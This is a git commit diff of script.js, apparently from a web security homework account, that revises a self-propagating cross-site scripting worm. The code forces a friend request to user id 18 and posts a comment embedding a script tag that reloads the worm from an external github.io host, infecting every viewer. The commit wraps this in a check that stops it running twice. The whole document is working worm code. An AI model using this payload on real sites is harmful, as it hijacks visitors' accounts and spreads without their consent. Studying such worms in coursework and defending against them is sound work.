0523b55b19b739b85369593620dcaa2a31d654d0
homework6-dev <57599709+homework6-dev@users.noreply.github.com>
2019-11-10 14:14:22 -0500

    added fix

--- script.js
+++ script.js
@@ -1,9 +1,13 @@
-a=new XMLHttpRequest();
-a.open('POST','/add_friend.php?id=18',true);
-a.send();
-b='hello, friend<script type="text/javascript" src="https://homework6-dev.github.io/hw6/script.js"></script>';
-c=new XMLHttpRequest();
-c.open('GET','/add_comment.php?comment='+b,true);
-c.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
-c.send();
-console.log("success");
+if(document.getElementById("the_script_has_been_run") == null){
+  a=new XMLHttpRequest();
+  a.open('POST','/add_friend.php?id=18',true);
+  a.send();
+  b='hello, friend<script type="text/javascript" src="https://homework6-dev.github.io/hw6/script.js"></script>';
+  c=new XMLHttpRequest();
+  c.open('GET','/add_comment.php?comment='+b,true);
+  c.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+  c.send();
+  console.log("success");
+} else {
+   
+}
